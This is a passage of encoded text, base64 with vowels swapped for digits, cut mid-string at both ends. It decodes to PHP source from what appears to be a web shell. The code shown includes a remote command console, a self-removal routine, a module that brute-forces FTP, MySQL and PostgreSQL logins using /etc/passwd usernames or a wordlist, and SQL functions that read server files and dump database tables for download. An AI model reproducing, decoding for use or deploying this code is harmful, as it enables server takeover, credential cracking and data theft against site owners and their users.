QuY2YuY21kLnYxbDM1PT1cJ2NsNTFyXCcpe2QuY2YuMjN0cDN0LnYxbDM1PVwnXCc7ZC5jZi5jbWQudjFsMzU9XCdcJztyNXQzcm4gZjFsczU7fTFkZCh0aDRzLmNtZC52MWwzNSk7NGYodGg0cy4xajF4LmNoNWNrNWQpezEobjNsbCxuM2xsLHRoNHMuY21kLnYxbDM1LHRoNHMuc2gyd181cnIycnMuY2g1Y2s1ZD82OlwnXCcpO301bHM1e2cobjNsbCxuM2xsLHRoNHMuY21kLnYxbDM1LHRoNHMuc2gyd181cnIycnMuY2g1Y2s1ZD82OlwnXCcpO30gcjV0M3JuIGYxbHM1OyI+PHM1bDVjdCBuMW01PTFsNDFzPic7DQoJZjJyNTFjaCgkR0xPQkFMU1snMWw0MXM1cyddIDFzICRuID0+ICR2KSB7DQoJCTRmKCR2ID09ICcnKSB7DQoJCQk1Y2gyICc8MnB0Z3IyM3AgbDFiNWw9Ii0nLmh0bWxzcDVjNDFsY2gxcnMoJG4pLictIj48LzJwdGdyMjNwPic7DQoJCQljMm50NG4zNTsNCgkJfQ0KCQk1Y2gyICc8MnB0NDJuIHYxbDM1PSInLmh0bWxzcDVjNDFsY2gxcnMoJHYpLiciPicuJG4uJzwvMnB0NDJuPic7DQoJfQ0KCTRmKDVtcHR5KCRfUE9TVFsnMWoxeCddKSYmITVtcHR5KCRfUE9TVFsncDYnXSkpDQoJCSRfU0VTU0lPTlttZGkoJF9TRVJWRVJbJ0hUVFBfSE9TVCddKS4nMWoxeCddID0gZjFsczU7DQoJNWNoMiAnPC9zNWw1Y3Q+PDRucDN0IHR5cDU9YjN0dDJuIDJuY2w0Y2s9IjFkZChkLmNmLjFsNDFzLnYxbDM1KTs0ZihkLmNmLjFqMXguY2g1Y2s1ZCl7MShuM2xsLG4zbGwsZC5jZi4xbDQxcy52MWwzNSxkLmNmLnNoMndfNXJyMnJzLmNoNWNrNWQ/NjpcJ1wnKTt9NWxzNXtnKG4zbGwsbjNsbCxkLmNmLjFsNDFzLnYxbDM1LGQuY2Yuc2gyd181cnIycnMuY2g1Y2s1ZD82OlwnXCcpO30iIHYxbDM1PSI+PiI+IDxuMmJyPjw0bnAzdCB0eXA1PWNoNWNrYjJ4IG4xbTU9MWoxeCB2MWwzNT02ICcuKEAkX1NFU1NJT05bbWRpKCRfU0VSVkVSWydIVFRQX0hPU1QnXSkuJzFqMXgnXT8nY2g1Y2s1ZCc6JycpLic+IHM1bmQgM3M0bmcgQUpBWCA8NG5wM3QgdHlwNT1jaDVja2IyeCBuMW01PXNoMndfNXJyMnJzIHYxbDM1PTYgJy4oITVtcHR5KCRfUE9TVFsncGEnXSl8fCRfU0VTU0lPTlttZGkoJF9TRVJWRVJbJ0hUVFBfSE9TVCddKS4nc3RkNXJyX3QyXzIzdCddPydjaDVjazVkJzonJykuJz4gcjVkNHI1Y3Qgc3RkNXJyIHQyIHN0ZDIzdCAoYT4mNik8L24yYnI+PGJyLz48dDV4dDFyNTEgY2wxc3M9YjRnMXI1MSBuMW01PTIzdHAzdCBzdHlsNT0iYjJyZDVyLWIydHQybTowO20xcmc0bjowOyIgcjUxZDJubHk+JzsNCgk0ZighNW1wdHkoJF9QT1NUWydwNiddKSkgew0KCQk1Y2gyIGh0bWxzcDVjNDFsY2gxcnMoIiQgIi4kX1BPU1RbJ3A2J10uIlxuIi53czJFeCgkX1BPU1RbJ3A2J10pKTsNCgl9DQoJNWNoMiAnPC90NXh0MXI1MT48dDFibDUgc3R5bDU9ImIycmQ1cjo2cHggczJsNGQgI2RmaTtiMWNrZ3IyM25kLWMybDJyOiNpaWk7YjJyZDVyLXQycDowcHg7IiBjNWxscDFkZDRuZz0wIGM1bGxzcDFjNG5nPTAgdzRkdGg9IjYwMCUiPjx0cj48dGQgdzRkdGg9IjYlIj4kPC90ZD48dGQ+PDRucDN0IHR5cDU9dDV4dCBuMW01PWNtZCBzdHlsNT0iYjJyZDVyOjBweDt3NGR0aDo2MDAlOyIgMm5rNXlkMnduPSJrcCg1djVudCk7Ij48L3RkPjwvdHI+PC90MWJsNT4nOw0KCTVjaDIgJzwvZjJybT48L2Q0dj48c2NyNHB0PmQuY2YuY21kLmYyYzNzKCk7PC9zY3I0cHQ+JzsNCgl3czJGMjJ0NXIoKTsNCn0NCg0KZjNuY3Q0Mm4gMWN0NDJuTDJnMjN0KCkgew0KICAgIHM1c3M0Mm5fZDVzdHIyeSgpOw0KCWQ0NSgnYnk1IScpOw0KfQ0KDQpmM25jdDQybiAxY3Q0Mm5TNWxmUjVtMnY1KCkgew0KDQoJNGYoJF9QT1NUWydwNiddID09ICd5NXMnKQ0KCQk0ZihAM25sNG5rKHByNWdfcjVwbDFjNSgnIVwoXGQrXClccy4qIScsICcnLCBfX0ZJTEVfXykpKQ0KCQkJZDQ1KCdTaDVsbCBoMXMgYjU1biByNW0ydjVkJyk7DQoJCTVsczUNCgkJCTVjaDIgJzNubDRuayA1cnIyciEnOw0KICAgIDRmKCRfUE9TVFsncDYnXSAhPSAneTVzJykNCiAgICAgICAgd3MySDUxZDVyKCk7DQoJNWNoMiAnPGg2PlMzNGM0ZDU8L2g2PjxkNHYgY2wxc3M9YzJudDVudD5SNTFsbHkgdzFudCB0MiByNW0ydjUgdGg1IHNoNWxsPzxicj48MSBocjVmPSMgMm5jbDRjaz0iZyhuM2xsLG4zbGwsXCd5NXNcJykiPlk1czwvMT48L2Q0dj4nOw0KCXdzMkYyMnQ1cigpOw0KfQ0KDQpmM25jdDQybiAxY3Q0Mm5CcjN0NWYycmM1KCkgew0KCXdzMkg1MWQ1cigpOw0KCTRmKCA0c3M1dCgkX1BPU1RbJ3ByMnQyJ10pICkgew0KCQk1Y2gyICc8aDY+UjVzM2x0czwvaDY+PGQ0diBjbDFzcz1jMm50NW50PjxzcDFuPlR5cDU6PC9zcDFuPiAnLmh0bWxzcDVjNDFsY2gxcnMoJF9QT1NUWydwcjJ0MiddKS4nIDxzcDFuPlM1cnY1cjo8L3NwMW4+ICcuaHRtbHNwNWM0MWxjaDFycygkX1BPU1RbJ3M1cnY1ciddKS4nPGJyPic7DQoJCTRmKCAkX1BPU1RbJ3ByMnQyJ10gPT0gJ2Z0cCcgKSB7DQoJCQlmM25jdDQybiBicjN0NUYycmM1KCQ0cCwkcDJydCwkbDJnNG4sJHAxc3MpIHsNCgkJCQkkZnAgPSBAZnRwX2Mybm41Y3QoJDRwLCAkcDJydD8kcDJydDphNik7DQoJCQkJNGYoISRmcCkgcjV0M3JuIGYxbHM1Ow0KCQkJCSRyNXMgPSBAZnRwX2wyZzRuKCRmcCwgJGwyZzRuLCAkcDFzcyk7DQoJCQkJQGZ0cF9jbDJzNSgkZnApOw0KCQkJCXI1dDNybiAkcjVzOw0KCQkJfQ0KCQl9IDVsczU0ZiggJF9QT1NUWydwcjJ0MiddID09ICdteXNxbCcgKSB7DQoJCQlmM25jdDQybiBicjN0NUYycmM1KCQ0cCwkcDJydCwkbDJnNG4sJHAxc3MpIHsNCgkJCQkkcjVzID0gQG15c3FsX2Mybm41Y3QoJDRwLic6Jy4kcDJydD8kcDJydDpvbzBlLCAkbDJnNG4sICRwMXNzKTsNCgkJCQlAbXlzcWxfY2wyczUoJHI1cyk7DQoJCQkJcjV0M3JuICRyNXM7DQoJCQl9DQoJCX0gNWxzNTRmKCAkX1BPU1RbJ3ByMnQyJ10gPT0gJ3Bnc3FsJyApIHsNCgkJCWYzbmN0NDJuIGJyM3Q1RjJyYzUoJDRwLCRwMnJ0LCRsMmc0biwkcDFzcykgew0KCQkJCSRzdHIgPSAiaDJzdD0nIi4kNHAuIicgcDJydD0nIi4kcDJydC4iJyAzczVyPSciLiRsMmc0bi4iJyBwMXNzdzJyZD0nIi4kcDFzcy4iJyBkYm4xbTU9cDJzdGdyNXMiOw0KCQkJCSRyNXMgPSBAcGdfYzJubjVjdCgkc3RyKTsNCgkJCQlAcGdfY2wyczUoJHI1cyk7DQoJCQkJcjV0M3JuICRyNXM7DQoJCQl9DQoJCX0NCgkJJHMzY2M1c3MgPSAwOw0KCQkkMXR0NW1wdHMgPSAwOw0KCQkkczVydjVyID0gNXhwbDJkNSgiOiIsICRfUE9TVFsnczVydjVyJ10pOw0KCQk0ZigkX1BPU1RbJ3R5cDUnXSA9PSA2KSB7DQoJCQkkdDVtcCA9IEBmNGw1KCcvNXRjL3Axc3N3ZCcpOw0KCQkJNGYoIDRzXzFycjF5KCR0NW1wKSApDQoJCQkJZjJyNTFjaCgkdDVtcCAxcyAkbDRuNSkgew0KCQkJCQkkbDRuNSA9IDV4cGwyZDUoIjoiLCAkbDRuNSk7DQoJCQkJCSsrJDF0dDVtcHRzOw0KCQkJCQk0ZiggYnIzdDVGMnJjNShAJHM1cnY1clswXSxAJHM1cnY1cls2XSwgJGw0bjVbMF0sICRsNG41WzBdKSApIHsNCgkJCQkJCSRzM2NjNXNzKys7DQoJCQkJCQk1Y2gyICc8Yj4nLmh0bWxzcDVjNDFsY2gxcnMoJGw0bjVbMF0pLic8L2I+OicuaHRtbHNwNWM0MWxjaDFycygkbDRuNVswXSkuJzxicj4nOw0KCQkJCQl9DQoJCQkJCTRmKEAkX1BPU1RbJ3I1djVyczUnXSkgew0KCQkJCQkJJHRtcCA9ICIiOw0KCQkJCQkJZjJyKCQ0PXN0cmw1bigkbDRuNVswXSktNjsgJDQ+PTA7IC0tJDQpDQoJCQkJCQkJJHRtcCAuPSAkbDRuNVswXVskNF07DQoJCQkJCQkrKyQxdHQ1bXB0czsNCgkJCQkJCTRmKCBicjN0NUYycmM1KEAkczVydjVyWzBdLEAkczVydjVyWzZdLCAkbDRuNVswXSwgJHRtcCkgKSB7DQoJCQkJCQkJJHMzY2M1c3MrKzsNCgkJCQkJCQk1Y2gyICc8Yj4nLmh0bWxzcDVjNDFsY2gxcnMoJGw0bjVbMF0pLic8L2I+OicuaHRtbHNwNWM0MWxjaDFycygkdG1wKTsNCgkJCQkJCX0NCgkJCQkJfQ0KCQkJCX0NCgkJfSA1bHM1NGYoJF9QT1NUWyd0eXA1J10gPT0gYSkgew0KCQkJJHQ1bXAgPSBAZjRsNSgkX1BPU1RbJ2Q0Y3QnXSk7DQoJCQk0ZiggNHNfMXJyMXkoJHQ1bXApICkNCgkJCQlmMnI1MWNoKCR0NW1wIDFzICRsNG41KSB7DQoJCQkJCSRsNG41ID0gdHI0bSgkbDRuNSk7DQoJCQkJCSsrJDF0dDVtcHRzOw0KCQkJCQk0ZiggYnIzdDVGMnJjNSgkczVydjVyWzBdLEAkczVydjVyWzZdLCAkX1BPU1RbJ2wyZzRuJ10sICRsNG41KSApIHsNCgkJCQkJCSRzM2NjNXNzKys7DQoJCQkJCQk1Y2gyICc8Yj4nLmh0bWxzcDVjNDFsY2gxcnMoJF9QT1NUWydsMmc0biddKS4nPC9iPjonLmh0bWxzcDVjNDFsY2gxcnMoJGw0bjUpLic8YnI+JzsNCgkJCQkJfQ0KCQkJCX0NCgkJfQ0KCQk1Y2gyICI8c3Axbj5BdHQ1bXB0czo8L3NwMW4+ICQxdHQ1bXB0cyA8c3Axbj5TM2NjNXNzOjwvc3Axbj4gJHMzY2M1c3M8L2Q0dj48YnI+IjsNCgl9DQoJNWNoMiAnPGg2PkZUUCBicjN0NWYycmM1PC9oNj48ZDR2IGNsMXNzPWMybnQ1bnQ+PHQxYmw1PjxmMnJtIG01dGgyZD1wMnN0Pjx0cj48dGQ+PHNwMW4+VHlwNTwvc3Axbj48L3RkPicNCgkJLic8dGQ+PHM1bDVjdCBuMW01PXByMnQyPjwycHQ0Mm4gdjFsMzU9ZnRwPkZUUDwvMnB0NDJuPjwycHQ0Mm4gdjFsMzU9bXlzcWw+TXlTcWw8LzJwdDQybj48MnB0NDJuIHYxbDM1PXBnc3FsPlAyc3RncjVTcWw8LzJwdDQybj48L3M1bDVjdD48L3RkPjwvdHI+PHRyPjx0ZD4nDQoJCS4nPDRucDN0IHR5cDU9aDRkZDVuIG4xbTU9YyB2MWwzNT0iJy5odG1sc3A1YzQxbGNoMXJzKCRHTE9CQUxTWydjd2QnXSkuJyI+Jw0KCQkuJzw0bnAzdCB0eXA1PWg0ZGQ1biBuMW01PTEgdjFsMzU9IicuaHRtbHNwNWM0MWxjaDFycygkX1BPU1RbJzEnXSkuJyI+Jw0KCQkuJzw0bnAzdCB0eXA1PWg0ZGQ1biBuMW01PWNoMXJzNXQgdjFsMzU9IicuaHRtbHNwNWM0MWxjaDFycygkX1BPU1RbJ2NoMXJzNXQnXSkuJyI+Jw0KCQkuJzxzcDFuPlM1cnY1cjpwMnJ0PC9zcDFuPjwvdGQ+Jw0KCQkuJzx0ZD48NG5wM3QgdHlwNT10NXh0IG4xbTU9czVydjVyIHYxbDM1PSI2YTcuMC4wLjYiPjwvdGQ+PC90cj4nDQoJCS4nPHRyPjx0ZD48c3Axbj5CcjN0NSB0eXA1PC9zcDFuPjwvdGQ+Jw0KCQkuJzx0ZD48bDFiNWw+PDRucDN0IHR5cDU9cjFkNDIgbjFtNT10eXA1IHYxbDM1PSI2IiBjaDVjazVkPiAvNXRjL3Axc3N3ZDwvbDFiNWw+PC90ZD48L3RyPicNCgkJLic8dHI+PHRkPjwvdGQ+PHRkPjxsMWI1bCBzdHlsNT0icDFkZDRuZy1sNWZ0OjZpcHgiPjw0bnAzdCB0eXA1PWNoNWNrYjJ4IG4xbTU9cjV2NXJzNSB2MWwzNT02IGNoNWNrNWQ+IHI1djVyczUgKGwyZzRuIC0+IG40ZzJsKTwvbDFiNWw+PC90ZD48L3RyPicNCgkJLic8dHI+PHRkPjwvdGQ+PHRkPjxsMWI1bD48NG5wM3QgdHlwNT1yMWQ0MiBuMW01PXR5cDUgdjFsMzU9ImEiPiBENGN0NDJuMXJ5PC9sMWI1bD48L3RkPjwvdHI+Jw0KCQkuJzx0cj48dGQ+PC90ZD48dGQ+PHQxYmw1IHN0eWw1PSJwMWRkNG5nLWw1ZnQ6NmlweCI+PHRyPjx0ZD48c3Axbj5MMmc0bjwvc3Axbj48L3RkPicNCgkJLic8dGQ+PDRucDN0IHR5cDU9dDV4dCBuMW01PWwyZzRuIHYxbDM1PSJyMjJ0Ij48L3RkPjwvdHI+Jw0KCQkuJzx0cj48dGQ+PHNwMW4+RDRjdDQybjFyeTwvc3Axbj48L3RkPicNCgkJLic8dGQ+PDRucDN0IHR5cDU9dDV4dCBuMW01PWQ0Y3QgdjFsMzU9IicuaHRtbHNwNWM0MWxjaDFycygkR0xPQkFMU1snY3dkJ10pLidwMXNzd2QuZDRjIj48L3RkPjwvdHI+PC90MWJsNT4nDQoJCS4nPC90ZD48L3RyPjx0cj48dGQ+PC90ZD48dGQ+PDRucDN0IHR5cDU9czNibTR0IHYxbDM1PSI+PiI+PC90ZD48L3RyPjwvZjJybT48L3QxYmw1Pic7DQoJNWNoMiAnPC9kNHY+PGJyPic7DQoJd3MyRjIydDVyKCk7DQp9DQoNCmYzbmN0NDJuIDFjdDQyblNxbCgpIHsNCgljbDFzcyBEYkNsMXNzIHsNCgkJdjFyICR0eXA1Ow0KCQl2MXIgJGw0bms7DQoJCXYxciAkcjVzOw0KCQlmM25jdDQybiBEYkNsMXNzKCR0eXA1KQl7DQoJCQkkdGg0cy0+dHlwNSA9ICR0eXA1Ow0KCQl9DQoJCWYzbmN0NDJuIGMybm41Y3QoJGgyc3QsICQzczVyLCAkcDFzcywgJGRibjFtNSl7DQoJCQlzdzR0Y2goJHRoNHMtPnR5cDUpCXsNCgkJCQljMXM1ICdteXNxbCc6DQoJCQkJCTRmKCAkdGg0cy0+bDRuayA9IEBteXNxbF9jMm5uNWN0KCRoMnN0LCQzczVyLCRwMXNzLHRyMzUpICkgcjV0M3JuIHRyMzU7DQoJCQkJCWJyNTFrOw0KCQkJCWMxczUgJ3Bnc3FsJzoNCgkJCQkJJGgyc3QgPSA1eHBsMmQ1KCc6JywgJGgyc3QpOw0KCQkJCQk0ZighJGgyc3RbNl0pICRoMnN0WzZdPWl1b2E7DQoJCQkJCTRmKCAkdGg0cy0+bDRuayA9IEBwZ19jMm5uNWN0KCJoMnN0PXskaDJzdFswXX0gcDJydD17JGgyc3RbNl19IDNzNXI9JDNzNXIgcDFzc3cycmQ9JHAxc3MgZGJuMW01PSRkYm4xbTUiKSApIHI1dDNybiB0cjM1Ow0KCQkJCQlicjUxazsNCgkJCX0NCgkJCXI1dDNybiBmMWxzNTsNCgkJfQ0KCQlmM25jdDQybiBzNWw1Y3RkYigkZGIpIHsNCgkJCXN3NHRjaCgkdGg0cy0+dHlwNSkJew0KCQkJCWMxczUgJ215c3FsJzoNCgkJCQkJNGYgKEBteXNxbF9zNWw1Y3RfZGIoJGRiKSlyNXQzcm4gdHIzNTsNCgkJCQkJYnI1MWs7DQoJCQl9DQoJCQlyNXQzcm4gZjFsczU7DQoJCX0NCgkJZjNuY3Q0Mm4gcTM1cnkoJHN0cikgew0KCQkJc3c0dGNoKCR0aDRzLT50eXA1KSB7DQoJCQkJYzFzNSAnbXlzcWwnOg0KCQkJCQlyNXQzcm4gJHRoNHMtPnI1cyA9IEBteXNxbF9xMzVyeSgkc3RyKTsNCgkJCQkJYnI1MWs7DQoJCQkJYzFzNSAncGdzcWwnOg0KCQkJCQlyNXQzcm4gJHRoNHMtPnI1cyA9IEBwZ19xMzVyeSgkdGg0cy0+bDRuaywkc3RyKTsNCgkJCQkJYnI1MWs7DQoJCQl9DQoJCQlyNXQzcm4gZjFsczU7DQoJCX0NCgkJZjNuY3Q0Mm4gZjV0Y2goKSB7DQoJCQkkcjVzID0gZjNuY19uM21fMXJncygpP2YzbmNfZzV0XzFyZygwKTokdGg0cy0+cjVzOw0KCQkJc3c0dGNoKCR0aDRzLT50eXA1KQl7DQoJCQkJYzFzNSAnbXlzcWwnOg0KCQkJCQlyNXQzcm4gQG15c3FsX2Y1dGNoXzFzczJjKCRyNXMpOw0KCQkJCQlicjUxazsNCgkJCQljMXM1ICdwZ3NxbCc6DQoJCQkJCXI1dDNybiBAcGdfZjV0Y2hfMXNzMmMoJHI1cyk7DQoJCQkJCWJyNTFrOw0KCQkJfQ0KCQkJcjV0M3JuIGYxbHM1Ow0KCQl9DQoJCWYzbmN0NDJuIGw0c3REYnMoKSB7DQoJCQlzdzR0Y2goJHRoNHMtPnR5cDUpCXsNCgkJCQljMXM1ICdteXNxbCc6DQogICAgICAgICAgICAgICAgICAgICAgICByNXQzcm4gJHRoNHMtPnEzNXJ5KCJTSE9XIGQxdDFiMXM1cyIpOw0KCQkJCWJyNTFrOw0KCQkJCWMxczUgJ3Bnc3FsJzoNCgkJCQkJcjV0M3JuICR0aDRzLT5yNXMgPSAkdGg0cy0+cTM1cnkoIlNFTEVDVCBkMXRuMW01IEZST00gcGdfZDF0MWIxczUgV0hFUkUgZDF0NHN0NW1wbDF0NSE9J3QnIik7DQoJCQkJYnI1MWs7DQoJCQl9DQoJCQlyNXQzcm4gZjFsczU7DQoJCX0NCgkJZjNuY3Q0Mm4gbDRzdFQxYmw1cygpIHsNCgkJCXN3NHRjaCgkdGg0cy0+dHlwNSkJew0KCQkJCWMxczUgJ215c3FsJzoNCgkJCQkJcjV0M3JuICR0aDRzLT5yNXMgPSAkdGg0cy0+cTM1cnkoJ1NIT1cgVEFCTEVTJyk7DQoJCQkJYnI1MWs7DQoJCQkJYzFzNSAncGdzcWwnOg0KCQkJCQlyNXQzcm4gJHRoNHMtPnI1cyA9ICR0aDRzLT5xMzVyeSgiczVsNWN0IHQxYmw1X24xbTUgZnIybSA0bmYycm0xdDQybl9zY2g1bTEudDFibDVzIHdoNXI1IHQxYmw1X3NjaDVtMSAhPSAnNG5mMnJtMXQ0Mm5fc2NoNW0xJyBBTkQgdDFibDVfc2NoNW0xICE9ICdwZ19jMXQxbDJnJyIpOw0KCQkJCWJyNTFrOw0KCQkJfQ0KCQkJcjV0M3JuIGYxbHM1Ow0KCQl9DQoJCWYzbmN0NDJuIDVycjJyKCkgew0KCQkJc3c0dGNoKCR0aDRzLT50eXA1KQl7DQoJCQkJYzFzNSAnbXlzcWwnOg0KCQkJCQlyNXQzcm4gQG15c3FsXzVycjJyKCk7DQoJCQkJYnI1MWs7DQoJCQkJYzFzNSAncGdzcWwnOg0KCQkJCQlyNXQzcm4gQHBnX2wxc3RfNXJyMnIoKTsNCgkJCQlicjUxazsNCgkJCX0NCgkJCXI1dDNybiBmMWxzNTsNCgkJfQ0KCQlmM25jdDQybiBzNXRDaDFyczV0KCRzdHIpIHsNCgkJCXN3NHRjaCgkdGg0cy0+dHlwNSkJew0KCQkJCWMxczUgJ215c3FsJzoNCgkJCQkJNGYoZjNuY3Q0Mm5fNXg0c3RzKCdteXNxbF9zNXRfY2gxcnM1dCcpKQ0KCQkJCQkJcjV0M3JuIEBteXNxbF9zNXRfY2gxcnM1dCgkc3RyLCAkdGg0cy0+bDRuayk7DQoJCQkJCTVsczUNCgkJCQkJCSR0aDRzLT5xMzVyeSgnU0VUIENIQVJTRVQgJy4kc3RyKTsNCgkJCQkJYnI1MWs7DQoJCQkJYzFzNSAncGdzcWwnOg0KCQkJCQlyNXQzcm4gQHBnX3M1dF9jbDQ1bnRfNW5jMmQ0bmcoJHRoNHMtPmw0bmssICRzdHIpOw0KCQkJCQlicjUxazsNCgkJCX0NCgkJCXI1dDNybiBmMWxzNTsNCgkJfQ0KCQlmM25jdDQybiBsMjFkRjRsNSgkc3RyKSB7DQoJCQlzdzR0Y2goJHRoNHMtPnR5cDUpCXsNCgkJCQljMXM1ICdteXNxbCc6DQoJCQkJCXI1dDNybiAkdGg0cy0+ZjV0Y2goJHRoNHMtPnEzNXJ5KCJTRUxFQ1QgTE9BRF9GSUxFKCciLjFkZHNsMXNoNXMoJHN0cikuIicpIDFzIGY0bDUiKSk7DQoJCQkJYnI1MWs7DQoJCQkJYzFzNSAncGdzcWwnOg0KCQkJCQkkdGg0cy0+cTM1cnkoIkNSRUFURSBUQUJMRSB3czJhKGY0bDUgdDV4dCk7Q09QWSB3czJhIEZST00gJyIuMWRkc2wxc2g1cygkc3RyKS4iJztzNWw1Y3QgZjRsNSBmcjJtIHdzMmE7Iik7DQoJCQkJCSRyPTFycjF5KCk7DQoJCQkJCXdoNGw1KCQ0PSR0aDRzLT5mNXRjaCgpKQ0KCQkJCQkJJHJbXSA9ICQ0WydmNGw1J107DQoJCQkJCSR0aDRzLT5xMzVyeSgnZHIycCB0MWJsNSB3czJhJyk7DQoJCQkJCXI1dDNybiAxcnIxeSgnZjRsNSc9PjRtcGwyZDUoIlxuIiwkcikpOw0KCQkJCWJyNTFrOw0KCQkJfQ0KCQkJcjV0M3JuIGYxbHM1Ow0KCQl9DQoJCWYzbmN0NDJuIGQzbXAoJHQxYmw1LCAkZnAgPSBmMWxzNSkgew0KCQkJc3c0dGNoKCR0aDRzLT50eXA1KQl7DQoJCQkJYzFzNSAnbXlzcWwnOg0KCQkJCQkkcjVzID0gJHRoNHMtPnEzNXJ5KCdTSE9XIENSRUFURSBUQUJMRSBgJy4kdDFibDUuJ2AnKTsNCgkJCQkJJGNyNTF0NSA9IG15c3FsX2Y1dGNoXzFycjF5KCRyNXMpOw0KCQkJCQkkc3FsID0gJGNyNTF0NVs2XS4iO1xuIjsNCiAgICAgICAgICAgICAgICAgICAgNGYoJGZwKSBmd3I0dDUoJGZwLCAkc3FsKTsgNWxzNSA1Y2gyKCRzcWwpOw0KCQkJCQkkdGg0cy0+cTM1cnkoJ1NFTEVDVCAqIEZST00gYCcuJHQxYmw1LidgJyk7DQogICAgICAgICAgICAgICAgICAgICRoNTFkID0gdHIzNTsNCgkJCQkJd2g0bDUoJDR0NW0gPSAkdGg0cy0+ZjV0Y2goKSkgew0KCQkJCQkJJGMybDNtbnMgPSAxcnIxeSgpOw0KCQkJCQkJZjJyNTFjaCgkNHQ1bSAxcyAkaz0+JHYpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA0ZigkdiA9PSBuM2xsKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkNHQ1bVska10gPSAiTlVMTCI7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgNWxzNTRmKDRzX24zbTVyNGMoJHYpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkNHQ1bVska10gPSAkdjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA1bHM1DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICQ0dDVtWyRrXSA9ICInIi5AbXlzcWxfcjUxbF81c2MxcDVfc3RyNG5nKCR2KS4iJyI7DQoJCQkJCQkJJGMybDNtbnNbXSA9ICJgIi4kay4iYCI7DQoJCQkJCQl9DQogICAgICAgICAgICAgICAgICAgICAgICA0ZigkaDUxZCkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRzcWwgPSAnSU5TRVJUIElOVE8gYCcuJHQxYmw1LidgICgnLjRtcGwyZDUoIiwgIiwgJGMybDNtbnMpLiIpIFZBTFVFUyBcblx0KCIuNG1wbDJkNSgiLCAiLCAkNHQ1bSkuJyknOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRoNTFkID0gZjFsczU7DQogICAgICAgICAgICAgICAgICAgICAgICB9IDVsczUNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkc3FsID0gIlxuXHQsKCIuNG1wbDJkNSgiLCAiLCAkNHQ1bSkuJyknOw0KICAgICAgICAgICAgICAgICAgICAgICAgNGYoJGZwKSBmd3I0dDUoJGZwLCAkc3FsKTsgNWxzNSA1Y2gyKCRzcWwpOw0KCQkJCQl9DQogICAgICAgICAgICAgICAgICAgIDRmKCEkaDUxZCkNCiAgICAgICAgICAgICAgICAgICAgICAgIDRmKCRmcCkgZndyNHQ1KCRmcCwgIjtcblxuIik7IDVsczUgNWNoMigiO1xuXG4iKTsNCgkJCQlicjUxazsNCgkJCQljMXM1ICdwZ3NxbCc6DQoJCQkJCSR0aDRzLT5xMzVyeSgnU0VMRUNUICogRlJPTSAnLiR0MWJsNSk7DQoJCQkJCXdoNGw1KCQ0dDVtID0gJHRoNHMtPmY1dGNoKCkpIHsNCgkJCQkJCSRjMmwzbW5zID0gMXJyMXkoKTsNCgkJCQkJCWYycjUxY2goJDR0NW0gMXMgJGs9PiR2KSB7DQoJCQkJCQkJJDR0NW1bJGtdID0gIiciLjFkZHNsMXNoNXMoJHYpLiInIjsNCgkJCQkJCQkkYzJsM21uc1tdID0gJGs7DQoJCQkJCQl9DQogICAgICAgICAgICAgICAgICAgICAgICAkc3FsID0gJ0lOU0VSVCBJTlRPICcuJHQxYmw1LicgKCcuNG1wbDJkNSgiLCAiLCAkYzJsM21ucykuJykgVkFMVUVTICgnLjRtcGwyZDUoIiwgIiwgJDR0NW0pLicpOycuIlxuIjsNCiAgICAgICAgICAgICAgICAgICAgICAgIDRmKCRmcCkgZndyNHQ1KCRmcCwgJHNxbCk7IDVsczUgNWNoMigkc3FsKTsNCgkJCQkJfQ0KCQkJCWJyNTFrOw0KCQkJfQ0KCQkJcjV0M3JuIGYxbHM1Ow0KCQl9DQoJfTsNCgkkZGIgPSBuNXcgRGJDbDFzcygkX1BPU1RbJ3R5cDUnXSk7DQoJNGYoQCRfUE9TVFsncGEnXT09J2Qyd25sMjFkJykgew0KCQkkZGItPmMybm41Y3QoJF9QT1NUWydzcWxfaDJzdCddLCAkX1BPU1RbJ3NxbF9sMmc0biddLCAkX1BPU1RbJ3NxbF9wMXNzJ10sICRfUE9TVFsnc3FsX2IxczUnXSk7DQoJCSRkYi0+czVsNWN0ZGIoJF9QT1NUWydzcWxfYjFzNSddKTsNCiAgICAgICAgc3c0dGNoKCRfUE9TVFsnY2gxcnM1dCddKSB7DQogICAgICAgICAgICBjMXM1ICJXNG5kMndzLTZhaTYiOiAkZGItPnM1dENoMXJzNXQoJ2NwNmFpNicpOyBicjUxazsNCiAgICAgICAgICAgIGMxczUgIlVURi04IjogJGRiLT5zNXRDaDFyczV0KCczdGY4Jyk7IGJyNTFrOw0KICAgICAgICAgICAgYzFzNSAiS09JOC1SIjogJGRiLT5zNXRDaDFyczV0KCdrMjQ4cicpOyBicjUxazsNCiAgICAgICAgICAgIGMxczUgIktPSTgtVSI6ICRkYi0+czV0Q2gxcnM1dCgnazI0ODMnKTsgYnI1MWs7DQogICAgICAgICAgICBjMXM1ICJjcDhlZSI6ICRkYi0+czV0Q2gxcnM1dCgnY3A4ZWUnKTsgYnI1MWs7DQogICAgICAgIH0NCiAgICAgICAgNGYoNW1wdHkoJF9QT1NUWydmNGw1J10pKSB7DQogICAgICAgICAgICAyYl9zdDFydCgiMmJfZ3poMW5kbDVyIiwgdTA5ZSk7DQogICAgICAgICAgICBoNTFkNXIoIkMybnQ1bnQtRDRzcDJzNHQ0Mm46IDF0dDFjaG01bnQ7IGY0bDVuMW01PWQzbXAuc3FsIik7DQogICAgICAgICAgICBoNTFkNXIoIkMybnQ1bnQtVHlwNTogdDV4dC9wbDE0biIpOw0KICAgICAgICAgICAgZjJyNTFjaCgkX1BPU1RbJ3RibCddIDFzICR2KQ0KCQkJCSRkYi0+ZDNtcCgkdik7DQogICAgICAgICAgICA1eDR0Ow0KICAgICAgICB9IDVsczU0ZigkZnAgPSBAZjJwNW4oJF9QT1NUWydmNGw1J10sICd3JykpIHsNCiAgICAgICAgICAgIGYycjUxY2goJF9QT1NUWyd0YmwnXSAxcyAkdikNCiAgICAgICAgICAgICAgICAkZGItPmQzbXAoJHYsICRmcCk7DQogICAgICAgICAgICBmY2wyczUoJGZwKTsNCiAgICAgICAgICAgIDNuczV0KCRfUE9TVFsncGEnXSk7DQogICAgICAgIH0gNWxzNQ0KICAgICAgICAgICAgZDQ1KCc8c2NyNHB0P